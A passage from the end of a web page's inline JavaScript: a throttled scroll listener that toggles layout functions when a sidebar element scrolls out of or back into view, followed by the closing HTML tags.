      const rect = aside.getBoundingClientRect()
      if (asideVisible && rect.bottom < -border) {
        asideVisible = false
        becameInvisible()
      }

      if (!asideVisible && window.scrollY < border) {
        asideVisible = true
        becameVisible()
      }
    }
  }
  const throttleWaitMs = 250
  const onScroll = _.throttle(
    callWhenAsideScrollsUp(centerMain, leftMain),
    throttleWaitMs
  )
  window.addEventListener('scroll', onScroll)
}())
</script>

</body>
</html>
